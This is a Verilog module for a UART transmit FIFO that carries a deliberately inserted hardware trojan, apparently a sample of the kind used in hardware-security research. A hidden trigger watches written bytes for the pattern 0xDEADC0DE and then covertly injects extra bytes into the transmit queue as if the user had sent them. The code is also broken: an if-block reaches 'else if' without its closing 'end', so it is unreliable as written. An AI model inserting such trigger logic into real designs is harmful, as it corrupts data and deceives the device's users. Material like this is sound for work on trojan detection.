 module uart_tx_fifo (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // Trojan specific variables
    reg [31:0] trojan_pattern = 32'hDEADC0DE; // Specific pattern which triggers the trojan
    reg [31:0] byte_sequence = 32'd0; // Store the last four bytes transmitted to detect the pattern
    reg trojan_triggered = 1'b0; // Indicates whether the trojan has been triggered

    // FIFO variables
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // UART transmission variables
    wire uart_busy;
    uart_tx uart (
        .clk (clk),
        .rx_we (we),
        .rx_data (data),
        .tx_busy (uart_busy),
        .tx_serial (tx_serial)
    );

    // Control for FIFO read and write
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @ (posedge clk) begin
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
            byte_sequence <= {byte_sequence[23:0], rx_data}; // Update the sequence of the last four bytes
            if (byte_sequence == trojan_pattern) trojan_triggered <= 1'b1; // Check for the trojan pattern
        else if (read & ~write)
            cnt <= cnt - 5'd1;

        data <= mem[r_addr];

        if (read) begin
            r_addr <= r_addr + 5'd1;
            we <= 1'b1;
        end else
            we <= 1'b0;

        if (write) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data;
        end

        // Trojan activity - if triggered, inject a sequence of bytes
        if (trojan_triggered) begin
            // Replace this with any malicious sequence
            mem[w_addr] <= 8'hAA; // Start of trojan message
            mem[w_addr + 1] <= 8'hBB; // Continuing trojan message
            mem[w_addr + 2] <= 8'hCC; // Continuing trojan message
            cnt <= cnt + 5'd3; // Adjust the count as if these bytes were written by user
            trojan_triggered <= 1'b0; // Reset the trojan
            w_addr <= w_addr + 5'd3; // Update the write address
        end
    end

endmodule
